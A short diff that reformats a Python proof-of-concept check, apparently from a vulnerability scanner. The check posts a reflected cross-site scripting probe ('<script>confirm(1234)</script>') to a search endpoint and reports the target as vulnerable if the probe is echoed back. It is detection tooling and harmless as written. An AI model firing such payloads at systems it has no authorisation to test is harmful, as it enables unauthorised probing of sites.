@@ -50,12 +50,12 @@ class Poc(ABPoc):
             payload = "/index.php?s=/index/search/index.html"
             vul_url = arg + payload
             data = {
-                's':'<script>confirm(1234)</script>'
+                's': '<script>confirm(1234)</script>'
             }
-            response = requests.post(vul_url,data=data)
+            response = requests.post(vul_url, data=data)
             if response.status_code == 200 and '<script>confirm(1234)</script>' in response.text and 'class="panel-footer text-muted"' in response.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                target=self.target, name=self.vuln.name))
+                    target=self.target, name=self.vuln.name))
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
 
